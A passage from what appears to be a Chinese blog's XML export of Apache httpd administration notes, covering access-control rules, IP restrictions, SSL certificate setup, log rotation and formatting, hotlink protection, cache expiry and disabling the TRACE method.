    <content type="text"><![CDATA[apache 访问控制allow 和 deny 规则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先举例： 123Order deny,allowdeny from allallow from 127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们判断的依据是这样的： 看 Order 后面的，哪个在前，哪个在后 如果 deny 在前，那么就需要看 deny from 这句，然后看 allow from 这一句 规则是一条一条的匹配的，不管是 deny 在前还是 allow 在前，都是会生效的。比如例子中，先 deny 了所有，然后又 allow 了127.0.0.1，所以 127.0.0.1 是通过的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例子： 123Order allow,denyDeny from allAllow from 127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个就会 deny 所有了， 127.0.0.1也会被 deny 。因为顺序是先 allow 然后 deny ，虽然一开始 allow 了127.0.0.1，但是后面又拒绝了它。 12Order allow,denyDeny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的规则就表示，全部都不能通 12Order deny,allowDeny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的规则就表示，全部都不能通 1Order deny,allow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有顺序，没有具体的规则，表示，全部都可以通行（默认的），因为 allow 在最后。 1Order allow,deny &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个表示，全部都不能通行（默认的），因为 deny 在最后。 做某个目录闲置，只允许内网 ip 访问，这个目录可以是网站根目录，也就是整个站点都要做限制了。 12345678910[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf&lt;Directory "/data/www、"&gt; AllowOverride None Options None Order deny,allow Deny from all Allow from 127.0.0.1&lt;/Directory&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：只允许 127.0.0.1 访问，其他 ip 全部拒绝。 针对请求的 uri 去限制，前面安装的 discuz 论坛，访问后台是 admin.php，那么就可以针对这个 admin.php 做限制。 123456&lt;filesmatch "(.*)admin(.*)"&gt; Order Deny,Allow Deny from all Allow from 127.0.0.1&lt;/filesmatch&gt;` &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：这里用到了 filesmatch 语法，表示匹配的意思。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否有错，重启apache 服务 123[root@lamp ~]# apachectl -tSyntax OK[root@lamp ~]# apachectl restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用curl 测试 123456789101112131415161718[root@lamp ~]# curl -x192.168.0.99:80 -I www.test.com/admin.phpHTTP/1.1 403 ForbiddenDate: Thu, 05 Jan 2017 10:37:38 GMTServer: Apache/2.2.31 (Unix) PHP/5.6.6Content-Type: text/html; charset=iso-8859-1 [root@lamp ~]# curl -x127.0.0.1:80 -I www.test.com/admin.php HTTP/1.1 200 OKDate: Thu, 05 Jan 2017 10:37:40 GMTServer: Apache/2.2.31 (Unix) PHP/5.6.6X-Powered-By: PHP/5.6.6Set-Cookie: cbq6_2132_saltkey=W35308HL; expires=Sat, 04-Feb-2017 10:37:40 GMT; Max-Age=2592000; path=/; httponlySet-Cookie: cbq6_2132_lastvisit=1483609060; expires=Sat, 04-Feb-2017 10:37:40 GMT; Max-Age=2592000; path=/Set-Cookie: cbq6_2132_sid=PUbGdd; expires=Fri, 06-Jan-2017 10:37:40 GMT; Max-Age=86400; path=/Set-Cookie: cbq6_2132_lastact=1483612660%09admin.php%09; expires=Fri, 06-Jan-2017 10:37:40 GMT; Max-Age=86400; path=/Cache-Control: max-age=0Expires: Thu, 05 Jan 2017 10:37:40 GMTContent-Type: text/html; charset=gbk &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本机 ip 192.168.0.99 被拒绝，而 127.0.0.1 可以访问。 Apache设置禁止访问.txt文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做了目录禁止浏览后，目录下面的txt文件还是可以显示里面的内容的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 1234Options -Indexes FollowSymLinks AllowOverride All Order allow,deny Deny from all apache 禁止trace或track防止xss攻击&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;TRACE和TRACK是用来调试web服务器连接的HTTP方式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;支持该方式的服务器存在跨站脚本漏洞，通常在描述各种浏览器缺陷的时候，把”Cross-Site-Tracing”简称为XST。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者可以利用此漏洞欺骗合法用户并得到他们的私人信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;禁用trace可以使用rewrite功能来实现 12345&lt;IfModule mod_rewrite.c&gt; RewriteEngine On RewriteCondi %&#123;REQUEST_METHOD&#125; ^TRACE RewriteRule .* - [F]&lt;/IfModule&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者还可以直接在apache的配置文件中配置相应参数 1TraceEnable off]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[httpd-2.4.x 版本客户端访问控制]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F47.%20httpd-2.4.x%20%E7%89%88%E6%9C%AC%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[httpd-2.4.x 版本客户端访问控制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在apache2.4版本之前做客户端访问控制,是用Allow Deny Order指令做访问控制的,而在2.4的版本上是用的用法跟之前的版本大不相同,如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.2上的配置 12Order deny,allow Deny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.4上的配置 1Require all denied &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.2上的配置 12Order allow,deny Allow from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.4上的配置 1Require all granted &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面给出了几个例子在2.4版本上的配置 仅允许IP为192.168.1.1的主机访问 1234&lt;RequireAll&gt; require all granted require ip 192.168.1.1 &lt;/RequireAll&gt; 仅允许192.168.0.0/24网络的主机访问 1234&lt;RequireAll&gt; require all granted require ip 192.168.1.0/24 &lt;/RequireAll&gt; 禁止192.168.1.2的主机访问,其他的都允许访问, 1234&lt;RequireAll&gt; require all granted require not ip 192.168.1.2 &lt;/RequireAll&gt; 允许所有访问, 1require all granted &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：这个可以不用加容器 …… 直接,写在 …..里面就可以了 拒绝所有访问 1require all denied]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的order、allow、deny]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F45.%20apache%E7%9A%84order%E3%80%81allow%E3%80%81deny%2F</url>
    <content type="text"><![CDATA[apache的order、allow、deny&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个东西确实挺容易让人迷糊。其实也不难，只要掌握这样一条规律即可： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先举个例子： 123Order deny,allowdeny from allallow from 127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;判断的依据是这样的： 看Order后面的，哪个在前，哪个在后 如果deny在前，那么就需要看deny from 这句，然后看allow from 这一句 规则是一条一条的匹配的，不管是deny在前还是allow在前，都是会生效的。比如例子中，先deny 了所有，然后又allow了127.0.0.1，所以127.0.0.1是通过的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不妨再多举几个例子： 123Order allow,denydeny from allallow from 127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个就会deny所有了，127.0.0.1也会被deny。因为顺序是先allow然后deny，虽然一开始allow了127.0.0.1，但是后面又拒绝了它。 12Order allow,denydeny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全部都不能通行 12Order deny,allowdeny from all &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全部都不能通行 1Order deny,allow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全部都可以通行（默认的），记住即可 1Order allow,deny &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全部都不能通行（默认的），记住即可]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache编译安装参数说明]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F5.%20apache%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[apache编译安装参数说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache编译安装参数说明 12345678910111213141516171819202122./configure #配置源代码树--prefix=/usr/local/apache2 #体系无关文件的顶级安装目录prefix ，也就apache的安装目录。如果没有指定PREFIX，默认会装到/usr/local/apache2。--enable-module=so #打开 so 模块，so 模块是用来提 dso 支持的 apache 核心模块--enable-deflate=shared #支持网页压缩--enable-expires=shared #支持 http 控制--enable-rewrite=shared #支持 url 重写--enable-cache #支持缓存--enable-file-cache #支持文件缓存--enable-mem-cache #支持记忆缓存--enable-disk-cache #支持磁盘缓存--enable-static-support #支持静态连接(默认为动态连接)--enable-static-htpasswd #使用静态连接编译 htpasswd - 管理用于基本认证的用户文件--enable-static-htdigest #使用静态连接编译 htdigest - 管理用于摘要认证的用户文件 --enable-static-rotatelogs #使用静态连接编译 rotatelogs - 滚动 apache 日志的管道日志程序 --enable-static-logresolve #使用静态连接编译 logresolve - 解析 apache 日志中的ip地址为主机名--enable-static-htdbm #使用静态连接编译 htdbm - 操作 dbm 密码数据库 --enable-static-ab #使用静态连接编译 ab - apache http 服务器性能测试工具--enable-static-checkgid #使用静态连接编译 checkgid --disable-cgid #禁止用一个外部 cgi 守护进程执行cgi脚本--disable-cgi #禁止编译 cgi 版本的 PHP--disable-userdir #禁止用户从自己的主目录中提供页面--with-mpm=worker # 让apache以worker方式运行]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache几种限制ip的方法]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F46.%20apache%E5%87%A0%E7%A7%8D%E9%99%90%E5%88%B6ip%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[apache几种限制ip的方法 禁止访问某些文件/目录增加Files选项来控制，比如要不允许访问 .inc 扩展名的文件，保护php类库： 1234&lt;Files ~ "\.inc$"&gt; Order allow,deny Deny from all&lt;/Files&gt; 禁止访问某些指定的目录：（可以用 来进行正则匹配） 1234&lt;Directory ~ "^/var/www/（.+/）*[0-9]&#123;3&#125;"&gt; Order allow,deny Deny from all&lt;/Directory&gt; 通过文件匹配来进行禁止，比如禁止所有针对图片的访问： 1234&lt;FilesMatch \.(gif|jpeg|png)$&gt; Order allow,deny Deny from all&lt;/FilesMatch&gt; 针对URL相对路径的禁止访问： 1234&lt;Location /dir/&gt; Order allow,deny Deny from all&lt;/Location&gt; 禁止某些IP访问/只允许某些IP访问如果要控制禁止某些非法IP访问，在Directory选项控制： 123456&lt;Directory "/var/www/web/"&gt; Order allow,deny Allow from all Deny from 10.0.0.1 #阻止一个IP Deny from 192.168.0.0/24 #阻止一个IP段&lt;/Directory&gt; 只允许某些IP访问，适合比如就允许内部或者合作公司访问： 12345678910&lt;Directory "/var/www/web/"&gt; Order deny,allow Deny from all Allow from example.com #允许某个域名 Allow from 10.0.0.1 #允许一个IP Allow from 10.0.0.1 10.0.0.2 #允许多个IP Allow from 10.1.0.0/255.255.0.0 #允许一个IP段，掩码对 Allow from 10.0.1 192.168 #允许一个IP段，后面不填写 Allow from 192.168.0.0/24 #允许一个IP段，网络号&lt;/Directory&gt;]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 配置https 支持ssl]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F43.%20apache%20%E9%85%8D%E7%BD%AEhttps%20%E6%94%AF%E6%8C%81ssl%2F</url>
    <content type="text"><![CDATA[apache 配置https 支持ssl安装openssl&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache2.0 建议安装0.9版本，曾经试过2.0.59 对openssl-1.0编译不过去。下载Openssl 1234tar -zxf openssl-0.9.8k.tar.gz #解压安装包 cd openssl-0.9.8k #进入已经解压的安装包 ./config #配置安装。推荐使用默认配置 make &amp;&amp; make install #编译及安装 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;openssl默认将被安装到/usr/local/ssl 让apache支持ssl，编译的时候，要指定ssl支持。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;静态或者动态 静态方法即 –enable-ssl=static –with-ssl=/usr/local/ssl 动态方法 –enable-ssl=shared –with-ssl=/usr/local/ssl &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中第二种方法会在module/ 目录下生成 mod_ssl.so 模块，而静态不会有，当然第二种方法也需要在httpd.conf 中加入 1LoadModule ssl_module modules/mod_ssl.so 生成证书创建私钥&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在创建证书请求之前，您需要首先生成服务器证书私钥文件。 12cd /usr/local/ssl/bin #进入openssl安装目录 openssl genrsa -out server.key 2048 #运行openssl命令，生成2048位长的私钥server.key文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要对 server.key 添加保护密码，请使用 -des3 扩展命令。Windows环境下不支持加密格式私钥，Linux环境下使用加密格式私钥时，每次重启Apache都需要输入该私钥密码（例：openssl genrsa -des3 -out server.key 2048）。 1cp server.key /usr/local/apache/conf/ssl.key/ 生成证书请求（CSR）文件123456789openssl req -new -key server.key -out certreq.csr Country Name： #您所在国家的ISO标准代号，中国为CN State or Province Name： #您单位所在地省/自治区/直辖市 Locality Name： #您单位所在地的市/县/区 Organization Name： #您单位/机构/企业合法的名称 Organizational Unit Name： #部门名称 Common Name： #通用名，例如：www.itrus.com.cn。此项必须与您访问提供SSL服务的服务器时所应用的域名完全匹配。 Email Address： #邮件地址，不必输入，直接回车跳过 "extra"attributes #以下信息不必输入，回车跳过直到命令执行完毕。 备份私钥并提交证书请求&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;请将证书请求文件certreq.csr提交给天威诚信，并备份保存证书私钥文件server.key，等待证书的签发。服务器证书密钥对必须配对使用，私钥文件丢失将导致证书不可用。 安装证书获取服务器证书中级CA证书&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为保障服务器证书在客户端的兼容性，服务器证书需要安装两张中级CA证书(不同品牌证书，可能只有一张中级证书)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从邮件中获取中级CA证书： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将证书签发邮件中的从BEGIN到 END结束的两张中级CA证书内容（包括“—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”）粘贴到同一个记事本等文本编辑器中，中间用回车换行分隔。修改文件扩展名，保存为conf/ssl.crt/intermediatebundle.crt文件(如果只有一张中级证书，则只需要保存并安装一张中级证书)。 获取EV服务器证书&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将证书签发邮件中的从BEGIN到 END结束的服务器证书内容（包括“—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”） 粘贴到记事本等文本编辑器中，保存为ssl.crt/server.crt文件 apache的配置 2.0的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;httpd.conf 中增加 123456789101112Listen 443NameVirtualHost *:443 DocumentRoot "/data/web/www" ServerName aaa.com:443 ErrorLog "logs/error.log" CustomLog "logs/access.log" combined SSLEngine on SSLCertificateFile /usr/local/apache/conf/ssl.crt/server.crt SSLCertificateKeyFile /usr/local/apache/conf/ssl.key/server.key SSLCertificateChainFile /usr/local/apache/conf/ssl.crt/intermediatebundle.crt]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 安装好后如何查看编译时的参数]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F3.%20apache%20%E5%AE%89%E8%A3%85%E5%A5%BD%E5%90%8E%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E7%BC%96%E8%AF%91%E6%97%B6%E7%9A%84%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[apache 安装好后如何查看编译时的参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网上说，可以使用 apachectl -V 或者 apachectl -l 查看相关的编译的模块看。但是很显然看到的结果根本不是我们想要的。那么如何看呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你还没有删除源码包的目录，那恭喜你你可以得到一个完美的答案。 1cat apache源码包目录/config.log |head &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就能看到编译参数了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是，如果已经删除了目录或者已经make clean过，那么只好声抱歉，你得不到你想要的东东啦， 不过不要紧，还有一个手，就是： 1cat /usr/local/apache/build/config.nice &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看你的apache装在哪个目录下，就去看哪个目录下的 build/config.nice]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 日志切割问题]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F30.%20apache%20%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[apache 日志切割问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache的日志是可以自动切割的。 方法一： 使用 cronolog 为每一天建立一个新的日志1CustomLog "|bin/cronolog logs/access_%Y%m%d.log" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以按小时 1CustomLog "|bin/cronolog logs/access_%Y%m%d%h.log" combined 方法二：使用 rotatelogs 每一天记录一个日志1CustomLog "|bin/rotatelogs -l logs/access_%Y%m%d.log 86400" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每小时 1CustomLog "|bin/rotatelogs -l logs/access_%Y%m%d%H.log 3600" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再看apache rotatelogs语法 1rotatelogs [ -l ] logfile [ rotationtime [ offset ]] | [ filesizeM ] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选项 -l，使用本地时间代替GMT时间作为时间基准。注意：在一个改变GMT偏移量(比如夏令时)的环境中使用-l会导致不可预料的结果。所以一定要加上-l 否则出现的日志时间和实际时间是相差8小时的。 logfile： 它加上基准名就是日志文件名。如果logfile中包含”%”，则它会被视为用于strftime()的格式字符串；否则它会被自动加上以秒为单位的”.nnnnnnnnnn”后缀。这两种格式都表示新的日志开始使用的时间。 rotationtime： 日志文件滚动的以秒为单位的间隔时间。 offset：相对于UTC的时差的分钟数。如果省略，则假定为”0″并使用UTC时间。比如，要指定UTC时差为”-5小时”的地区的当地时间，则此参数应为”-300″。 filesizeM：指定以filesizeM文件大小滚动，而不是按照时间或时差滚动。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache配置防盗链]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F41.%20apache%E9%85%8D%E7%BD%AE%E9%98%B2%E7%9B%97%E9%93%BE%2F</url>
    <content type="text"><![CDATA[apache配置防盗链&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果站点是一个图片站，有很多非常漂亮的美女图片，时间久了会有很多人来网站借图片，有的直接下载走了，还有的直接取走图片的地址，那么他就可以直接把图片地址放到他自己的网站上，他的用户可以直接从他的网站上查看这个图片，而实际上浏览这个图片是从我的网站上访问的。这样，这个图片所产生的宽带开销对我来说没有任何意义，毕竟看图片的人不是我的客户，而是人家的。所以我们要把这些图片限制一下，凡是在第三方站点上，严禁访问我站点的图片。 12345678910[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.confSetEnvIfNoCase Referer "^http://.*\.test\.com" local_refSetEnvIfNoCase Referer ".*\.aaa\.com" local_refSetEnvIfNoCase Referer "^$" local_ref&lt;filesmatch "\.(txt|doc|mp3|zip|rar|jpg|gif|png|js|css)"&gt; Order Allow,Deny Allow from env=local_ref&lt;/filesmatch&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测是否有错，并重启apache 服务 123[root@lamp ~]# apachectl -tSyntax OK[root@lamp ~]# apachectl restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：在这段配置中涉及到一个名词 referer ，它其实就是上次访问的网站连接。我们是根据来源链接做限制的，如果来源链接并不是想要的，就直接拒绝，这就是防盗链的原理。当然不止是图片，mp3，rar，zip等文件同样支持。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache日志记录客户端请求的域名]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F32.%20apache%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9F%9F%E5%90%8D%2F</url>
    <content type="text"><![CDATA[apache日志记录客户端请求的域名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正常情况下，根本就没有必要记录这一项，毕竟咱们大都根据虚拟主机来设置相应的访问日志，但也有个别的情况，比如 1ServerName *.abc.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样泛解析的形式，所以有必要记录一下用户请求的域名到底是哪个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而apache的LogFormat 中正好有一项值满足了这个需求。即 %V 这里是大写的V ,小写的v 记录的是咱们在虚拟主机中设置的ServerName ，这个的确是没有必要记录的。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 日志中记录代理IP以及真实客户端IP]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F31.%20apache%20%E6%97%A5%E5%BF%97%E4%B8%AD%E8%AE%B0%E5%BD%95%E4%BB%A3%E7%90%86IP%E4%BB%A5%E5%8F%8A%E7%9C%9F%E5%AE%9E%E5%AE%A2%E6%88%B7%E7%AB%AFIP%2F</url>
    <content type="text"><![CDATA[apache 日志中记录代理IP以及真实客户端IP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认情况下log日志格式为： 1LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\"" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中%h 是记录访问者的IP，如果在web的前端有一层代理，那么这个%h其实就是代理机器的IP，这不是我们想要的。在这种情况下，%{X-FORWARDED-FOR}i 字段会记录客户端真实的IP。所以log日志改为： 1LogFormat "%h %&#123;X-FORWARDED-FOR&#125;i %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\"" combined]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache只记录指定URI的日志]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F33.%20apache%E5%8F%AA%E8%AE%B0%E5%BD%95%E6%8C%87%E5%AE%9AURI%E7%9A%84%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[apache只记录指定URI的日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求是，把类似请求 www.aaa.com/aaa/… 这样的请求才记录日志。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在httpd.conf 或者 相关的虚拟主机配置文件中添加 12SetEnvIf Request_URI "^/aaa/.*" aaa-requestCustomLog "|/usr/local/apache/bin/rotatelogs -l /usr/local/apache/logs/aaa-access_%Y%m%d.log 86400" combined env=aaa-request &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以了。这个原理和不记录图片等静态访问的日志]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让apache记录一个页面的访问时间]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F34.%20%E8%AE%A9apache%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[让apache记录一个页面的访问时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，需要我们通过访问日志来观察是哪个页面访问慢，从而可以了解我们网站的某个程序是不是存在问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑httpd.conf 1LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\"" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改成 1LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\" %D" combined &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的 %D就是记录页面执行时间的参数，单位是毫秒。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果，想使用s为单位的话，那把%D替换为%T &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启apahce即可生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考文档：http://man.chinaunix.net/newsoft/ApacheMenual_CN_2.2new/mod/mod_log_config.html]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使apache的日志文件里不记录图片文件]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F35.%20%E4%BD%BFapache%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E9%87%8C%E4%B8%8D%E8%AE%B0%E5%BD%95%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[使apache的日志文件里不记录图片文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到: 1234LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\"" combinedLogFormat "%h %l %u %t \"%r\" %&gt;s %b" commonLogFormat "%&#123;Referer&#125;i -&gt; %U" refererLogFormat "%&#123;User-agent&#125;i" agent &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再后面加上图片文件的类型 1234567891011121313SetEnvIf Request_URI \.gif$ gif-imageSetEnvIf Request_URI \.GIF$ gif-imageSetEnvIf Request_URI \.jpg$ gif-imageSetEnvIf Request_URI \.JPG$ gif-imageSetEnvIf Request_URI \.png$ gif-imageSetEnvIf Request_URI \.js$ gif-imageSetEnvIf Request_URI \.bmp$ gif-imageSetEnvIf Request_URI \.css$ gif-imageSetEnvIf Request_URI \.mid$ gif-imageSetEnvIf Request_URI \.swf$ gif-imageSetEnvIf Request_URI \.mmf$ gif-imageSetEnvIf Request_URI \.wma$ gif-imageSetEnvIf Request_URI \.midi$ gif-image &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;记日志时 1CustomLog /usr/local/apache/logs/access.log combined env=!gif-image]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 设置图片等静态文件的过期时间]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F39.%20apache%20%E8%AE%BE%E7%BD%AE%E5%9B%BE%E7%89%87%E7%AD%89%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[apache 设置图片等静态文件的过期时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;httpd.conf 中加入 12345678ExpiresActive onExpiresByType image/gif "access plus 1 days"ExpiresByType image/jpeg "access plus 24 hours"ExpiresByType image/png "access plus 24 hours"ExpiresByType text/css "now plus 2 hour"ExpiresByType application/x-javascript "now plus 2 hours"ExpiresByType application/x-shockwave-flash "now plus 2 hours"ExpiresDefault "now plus 0 min" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Expires 语法如下： 1ExpiresByType type/encoding "&lt;base&gt; [plus] &#123;&lt;num&gt; &lt;type&gt;&#125;*" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中是下列之一： access now (等价于’access’) modification &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;plus关键字是可选的。必须是整数[可以被atoi()接受的]，是下列之一： years months weeks days hours minutes seconds &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考： http://apache.chinahtml.com/mod/mod_expires.html]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache 配置静态缓存]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F37.%20apache%20%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E7%BC%93%E5%AD%98%2F</url>
